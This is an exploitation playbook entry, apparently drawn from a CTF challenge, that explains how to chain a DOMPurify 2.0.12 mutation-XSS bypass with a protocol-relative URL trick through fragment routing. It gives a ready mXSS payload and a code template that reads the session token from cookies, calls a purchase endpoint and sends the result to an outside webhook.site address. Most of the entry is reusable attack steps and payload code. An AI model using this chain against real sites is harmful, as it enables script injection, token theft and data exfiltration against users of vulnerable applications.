---
name: dompurify_2_0_12_mxss_protocol_relative_url
vuln_type: xss
sub_technique: dompurify_mxss_protocol_relative
category: exploitation
safety_level: cautious
tags:
- dompurify
- mxss
- math
- protocol-relative
- webhook
- bot
---

# Dompurify 2.0.12 Mxss Bypass (Math/Mtext/Mglyph/Style) + Protocol-Relative Url Ssrf

## When to Apply

DOMPurify 2.0.12 has a mutation XSS bug: `<math><mtext><table><mglyph><style>` causes the style tag's content to be reinterpreted as HTML after DOM mutation, allowing `<img onerror=...>` execution. The app fetches product details from a URL path that can be manipulated via `/#/%2f` to become `//webhook.site/...` (protocol-relative URL), loading attacker-controlled JSON with the mXSS payload.

## Prerequisites

- DOMPurify 2.0.12 with known mXSS bug
- Bot renders product detail HTML from fetched JSON
- URL path uses `/#/` fragment routing where `%2f` decodes to `/`
- webhook.site or similar service for JSON response + CORS headers

## Steps

1. Encode JS payload as base64: `fetch('/4/buy',{method:'POST',...}).then(...)→webhook`
2. Build mXSS payload:
   `<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=x onerror=eval(atob('...'))>">`
3. Configure webhook.site response: JSON `{"detail": mxss_payload}` with CORS headers.
4. Login as guest, submit report with path: `/#/%2fwebhook.site/{UUID}/detail`
5. Bot navigates to `/#//webhook.site/{UUID}/detail` → fetches attacker JSON.
6. mXSS fires → JS calls /4/buy → flag data sent to webhook.

## Code Template

```
js = f"fetch('/4/buy',{{method:'POST',headers:{{'token':document.cookie.split('=')[1]}}}}).then(r=>r.json()).then(d=>new Image().src='https://webhook.site/{UUID}/flag?d='+d.data)"
mxss = f'<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=x onerror=eval(atob(\'{b64(js)}\'))>">'
report_path = f'/#/%2fwebhook.site%2f{UUID}/detail'
```

## Examples

### Example 1

- **dompurify_version**: 2.0.12
- **mxss_trigger**: math→mtext→table→mglyph→style mutation
- **url_trick**: %2f → / → protocol-relative //webhook.site/...

DOMPurify 2.0.12 is a well-known vulnerable version. The mXSS relies on HTML5 parsing spec differences between the initial sanitization parse and the final DOM insertion. The protocol-relative URL trick via fragment routing is a neat SSRF primitive.
